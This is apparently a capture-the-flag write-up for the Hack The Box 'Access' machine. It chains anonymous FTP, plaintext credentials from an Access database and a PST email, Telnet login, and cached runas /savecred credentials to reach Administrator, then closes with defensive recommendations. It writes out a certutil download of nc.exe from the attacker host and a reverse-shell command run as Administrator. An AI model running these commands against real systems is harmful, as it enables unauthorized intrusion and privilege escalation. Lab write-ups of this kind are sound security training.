# Access — Hack The Box (CPTS practice)

**Platform:** Hack The Box
**Difficulty:** 🟢 Easy
**OS:** Windows
**Certification:** Extra practice for the CPTS (Certified Penetration Testing Specialist)
**Date completed:** 2026
**Techniques:** Nmap · Anonymous FTP · Microsoft Access database (`.mdb`) with `mdbtools` · Password-protected ZIP with a reused password · Outlook PST with `readpst` · Telnet · Cached `runas /savecred` credentials → Administrator
**Language:** English — [🇪🇸 Versión en español](./Access_Writeup_ES.md)

---

## Table of contents
1. [Reconnaissance](#1-reconnaissance)
2. [FTP enumeration — a cascading credential leak](#2-ftp-enumeration--a-cascading-credential-leak)
3. [Initial access — Telnet as `security`](#3-initial-access--telnet-as-security)
4. [Privilege escalation — `runas /savecred`](#4-privilege-escalation--runas-savecred)
5. [Post-exploitation and flags](#5-post-exploitation-and-flags)
6. [Lessons learned](#6-lessons-learned)
7. [Tool & command glossary](#7-tool--command-glossary)

---

## 1. Reconnaissance

We check the host is up and estimate its OS from the TTL:

```bash
ping -c 1 10.129.68.136
```

> 🛠️ **`ping`** — sends ICMP packets to check whether a host is alive. A TTL of **127** (starting from 128 minus one hop) is the classic signature of **Windows** (Linux usually starts at 64).

![](Imagenes/01-ping-ttl-windows.png)

Full TCP port scan:

```bash
nmap -sS -Pn -vvv --min-rate 5000 --open -n -p- 10.129.68.136 -oN AllPorts
```

![](Imagenes/02-nmap-todos-los-puertos.png)

> 🛠️ **`nmap -sS -Pn -vvv --min-rate 5000 --open -n -p-`** — a full SYN scan of all 65535 ports: `-sS` (stealthy, never completes the handshake), `-Pn` (don't skip the host even without a ping reply), `--min-rate 5000` (speeds up packet sending), `--open` (only open ports), `-n` (no DNS resolution).

To avoid manually re-reading the raw output, a personal enumeration tool summarizes Nmap's results:

```bash
enum-nmap AllPorts
```

> 🛠️ **`enum-nmap`** — a custom script (not a standard tool) that parses Nmap's output file and prints a clean summary: IP, detected TTL, estimated OS, open ports, and a copy-paste-ready list for the next scan's `-p` flag. Automates the manual step of reading Nmap's `.txt` output and extracting the ports.

![](Imagenes/03-enum-nmap-herramienta-propia.png)

Three open ports: **21** (ftp), **23** (telnet), and **80** (http). Version and default-script scan:

```bash
nmap -sS -Pn -sCV -T5 -n -p21,23,80 -oN Ports 10.129.68.136
```

![](Imagenes/04-nmap-version-servicios-ftp-telnet-iis.png)

| Port | Service | Detail |
|------|---------|--------|
| 21 | Microsoft ftpd | **`ftp-anon`: Anonymous FTP login allowed** |
| 23 | Microsoft Windows XP telnetd | Hostname `ACCESS`, `Product_Version: 6.1.7600` (Windows 7) |
| 80 | Microsoft IIS httpd 7.5 | Title **"MegaCorp"** |

> 💡 Nmap's own `ftp-anon` script already confirms the FTP server accepts **anonymous login**, no manual testing needed — the most obvious entry point of the three.

## 2. FTP enumeration — a cascading credential leak

We connect via FTP as the anonymous user:

```bash
ftp 10.129.68.136
Name: anonymous
Password: (anything)
```

> 🛠️ **`ftp`** — a command-line client for the FTP protocol. Many misconfigured servers allow **anonymous access** (username `anonymous`, any password) to share public files — here, it's the way in.

We switch to binary mode (mandatory to avoid corrupting non-text files) and explore:

```bash
ftp> binary
ftp> ls -la
ftp> cd Backups
ftp> get backup.mdb
```

> 🛠️ **`binary`** — switches FTP's transfer mode from ASCII to binary. Essential before downloading anything that isn't plain text (databases, executables, ZIPs...), since ASCII mode can alter control bytes and corrupt the file.

![](Imagenes/05-ftp-anonimo-backup-mdb.png)

The `Engineer` folder also holds a password-protected ZIP:

```bash
ftp> cd Engineer
ftp> get "Access Control.zip"
```

![](Imagenes/06-ftp-descarga-access-control-zip.png)

> 💡 Two files of interest: `backup.mdb` (a Microsoft Access database) and `Access Control.zip` (password-protected, still unknown at this point).

### 2.1 Pulling credentials out of the `.mdb`

A `.mdb` file is a **Microsoft Access** database. On Linux, it's analyzed with the `mdbtools` package, no need to have Access installed:

```bash
mdb-tables backup.mdb
```

> 🛠️ **`mdb-tables`** — lists every table inside a Microsoft Access `.mdb`/`.accdb` database. Part of the `mdbtools` package, the standard Linux toolkit for working with this proprietary format.

![](Imagenes/07-mdb-tables-backup-mdb.png)

Among dozens of tables belonging to an access-control system, we filter for anything credential-related:

```bash
mdb-tables backup.mdb | grep 'user'
```

> 🛠️ **`grep 'user'`** — filters the previous output down to lines containing "user", saving us from manually scanning the full table list. It isolates `auth_user`, `auth_user_groups`, `auth_user_user_permissions`, and a few others.

![](Imagenes/08-mdb-tables-grep-user.png)

`auth_user` is the obvious candidate. We export it to CSV for easy reading:

```bash
mdb-export backup.mdb auth_user
```

> 🛠️ **`mdb-export`** — dumps a specific table from the database as **CSV**, ready for any text-processing tool.

![](Imagenes/09-mdb-export-auth-user-csv.png)

```csv
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

We save the three credentials found:

![](Imagenes/10-credenciales-admin-engineer-backup-admin.png)

```
admin:admin
engineer:access4u@security
backup_admin:admin
```

### 2.2 The ZIP and the PST

We try `engineer`'s password against the downloaded ZIP:

```bash
7z x "Access Control.zip"
# Enter password: access4u@security
```

> 🛠️ **`7z x`** — extracts (`x` for *extract*) an archive's contents, prompting for a password if it's protected. Here it confirms `engineer`'s password is **reused** to protect this ZIP too.

![](Imagenes/11-7z-extraer-access-control-zip-password-engineer.png)

Inside there's an **`Access Control.pst`** file — a **Microsoft Outlook** mail archive. We process it with `readpst`:

```bash
readpst "Access Control.pst"
```

> 🛠️ **`readpst`** — converts a `.pst` file (Outlook's proprietary mail-storage format) into standard `.mbox` files readable with regular Unix tools, no Outlook installation required.

![](Imagenes/12-readpst-access-control-pst-mbox.png)

We read the extracted email:

```bash
cat "Access Control.mbox"
```

![](Imagenes/13-mbox-correo-nueva-password-security.png)

```
From: john@megacorp.com
Subject: MegaCorp Access Control System "security" account

Hi there,

The password for the "security" account has been changed to 4Cc3ssC0ntr0ller.
Please ensure this is passed on to your engineers.

Regards,
John
```

> 💡 A third generation of cascading credential leaks: anonymous FTP → Access database → ZIP (reused password) → email inside the PST. Each step unlocks the next without exploiting a single technical vulnerability — just **terrible credential hygiene**.

We save the new credential:

![](Imagenes/14-credenciales-actualizadas-security.png)

```
security:4Cc3ssC0ntr0ller
```

## 3. Initial access — Telnet as `security`

With the `security` account and its password, we connect via Telnet (the port 23 spotted earlier):

```bash
telnet 10.129.68.136
login: security
password: 4Cc3ssC0ntr0ller
```

> 🛠️ **`telnet`** — a client for the Telnet protocol, an **unencrypted** remote command-line access method (all traffic, credentials included, travels in plaintext). Obsolete in any modern production environment, but here it's a legitimately exposed lab service.

![](Imagenes/15-telnet-login-security.png)

Access confirmed as `security` on host **ACCESS**.

### 3.1 Locating the first flag

```
cd Desktop
dir
```

![](Imagenes/16-dir-desktop-user-txt.png)

We confirm `user.txt` (34 bytes) exists on `security`'s desktop — the lab's first flag.

## 4. Privilege escalation — `runas /savecred`

Browsing the public desktop (`C:\Users\Public\Desktop`), there's a shortcut to the access-control application:

```
type "ZKAccess3.5 Security System.lnk"
```

> 🛠️ **`type`** — `cmd.exe`'s equivalent of `cat`: prints a file's contents. A `.lnk` is a binary file (not plain text), so the output looks mostly garbled, but **embedded ASCII strings remain readable** — a quick way to pull strings out of a binary with no extra tools.

![](Imagenes/17-type-lnk-runas-savecred-administrator.png)

Amid the binary noise, the key line shows up:

```
runas.exe C:\ZKTeco\ZKAccess3.5\G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
```

> 💡 This shortcut launches the `Access.exe` application using **`runas /savecred`** as `ACCESS\Administrator`. The **`/savecred`** flag is the key to this whole privilege-escalation path: it tells Windows to **save (cache) the credentials** the first time they're used, so it never prompts again on subsequent `runas` calls **for that same user account on that same machine** — regardless of what command gets run afterward. If someone already ran this shortcut once (agreeing to save the Administrator password), those credentials stay cached and reusable by **any** user logged into the machine, for **any** command.

### 4.1 Reusing the cached credentials

We prepare a Windows `nc.exe` binary and serve it from an HTTP server on our attacker machine:

```bash
python3 -m http.server 8080
```

> 🛠️ **`python3 -m http.server`** — spins up a simple HTTP server for the current directory, no extra install needed. A quick, standard way to transfer files to a victim that has some HTTP client available.

![](Imagenes/18-compartir-nc-exe-python-http-server.png)

From the Telnet session (as `security`), we download the binary using a native Windows utility:

```
certutil -urlcache -split -f http://10.10.15.31:8080/nc.exe nc.exe
```

> 🛠️ **`certutil -urlcache -split -f`** — a legitimate Windows certificate-management tool that also supports downloading files over HTTP/HTTPS (`-urlcache -split -f <url> <destination>`). A well-known **"living off the land"** technique: pulling in offensive tooling using native system binaries, without needing to bring your own `wget`/`curl` or tripping as many alarms as an unknown binary would.

![](Imagenes/19-certutil-descarga-nc-exe-victima.png)

We generate a reverse-shell payload for Windows `nc.exe` (with help from a revshells.com-style payload generator):

```
nc.exe 10.10.15.31 444 -e cmd
```

![](Imagenes/20-revshells-nc-exe-reverse-payload.png)

> 🛠️ **`nc.exe -e cmd`** — the Windows build of Netcat supports `-e <program>`, which wires the network connection's input/output directly to a command interpreter (`cmd.exe`), giving a one-liner interactive remote shell.

And we launch it, not directly, but through `runas /savecred` as Administrator — **without ever needing to know the password**, since it's already cached:

```
runas /user:Administrator /savecred "nc.exe 10.10.15.31 444 -e cmd"
```

> 🛠️ **`runas /user:<user> /savecred "<command>"`** — runs the given command with another user's credentials. With `/savecred`, if a credential is already saved for that user (like the one the ZKAccess shortcut left behind), it **never asks for a password again** and reuses it to launch any arbitrary command — in this case, our reverse shell instead of the original application.

![](Imagenes/21-runas-savecred-nc-exe-reverse-shell.png)

With the listener already up:

```bash
nc -lvnp 444
```

![](Imagenes/22-nc-listener-444.png)

We catch the connection with **Administrator** privileges:

![](Imagenes/23-shell-access-administrator-whoami.png)

```
C:\Windows\system32>whoami
access\administrator
```

## 5. Post-exploitation and flags

```
cd C:\Users\Administrator\Desktop
dir
```

![](Imagenes/24-dir-desktop-administrator-root-txt.png)

We confirm `root.txt` (34 bytes) exists on Administrator's desktop — the final flag, proving full system compromise.

> 🔒 The exact contents of `user.txt` and `root.txt` aren't published in this writeup on purpose, so anyone practicing this same box still has to complete that last step themselves — the full path to each one is documented in §3.1 and §5.

## 6. Lessons learned

| Vulnerability | Where | Impact |
|----------------|-------|---------|
| FTP with anonymous access enabled, serving backups and internal files | Port 21 | An entry point requiring zero credentials |
| Access database with plaintext passwords in an `auth_user` table | `backup.mdb` | Anyone who gets the file walks away with credentials for several roles |
| Password reused between the `engineer` account and the ZIP's own protection | `Access Control.zip` | A single leaked password also compromises the encrypted content |
| Email holding a plaintext password, sitting inside an accessible `.pst` | `Access Control.pst` | Internal email ended up acting as a de facto third credential store |
| Administrator credentials cached persistently via `runas /savecred` | The `ZKAccess3.5 Security System.lnk` shortcut | Any locally logged-in user can run **any command** as Administrator without ever knowing the password |

## Defensive recommendations

- Disable anonymous FTP access unless strictly necessary, and never serve backups or internal files through it.
- Never store plaintext passwords in application databases (use salted hashing, like any serious authentication system should).
- Don't reuse passwords across different systems, protected archives, and accounts.
- Never leave plaintext credentials in emails, not even "temporarily" during a rotation.
- Avoid `runas /savecred` in production: it caches credentials persistently and exposes them to any local user with access to the session where it was used. If elevation must be automated, use a dedicated service account with minimal permissions, or Credential Manager with tightly restricted access policies.
- Migrate Telnet to an encrypted protocol (SSH) wherever remote command-line access is needed.
- Periodically audit which shortcuts and scheduled tasks rely on `runas`/saved credentials across the organization's machines.

## 7. Tool & command glossary

| Tool / command | What it's for |
|------------------|-----------------|
| `ping` | Check a host is alive and estimate its OS from the TTL |
| `nmap` | Scan a host for open ports, services, and versions |
| `ftp` | Command-line client for transferring files over FTP (including anonymous access) |
| `mdb-tables` / `mdb-export` (mdbtools) | List tables and export their content from a Microsoft Access (`.mdb`) database on Linux |
| `7z x` | Extract archives, including password-protected ones |
| `readpst` | Convert an Outlook `.pst` file into readable `.mbox` files, no Outlook required |
| `telnet` | Unencrypted remote command-line access client |
| `type` (cmd.exe) | Print a file's contents — also handy for pulling readable strings out of binaries |
| `python3 -m http.server` | A quick HTTP server for transferring files to a victim |
| `certutil -urlcache -split -f` | Download files over HTTP using a native Windows binary ("living off the land") |
| `nc` / `nc.exe -e cmd` | Netcat; on Windows, `-e` wires a command shell directly to the network connection |
| `runas /user:<user> /savecred "<command>"` | Run a command as another user, reusing already-cached credentials without prompting for a password |

---

*Written by [Arabot](https://github.com/Caan31) · Hack The Box · CPTS practice · 2026*
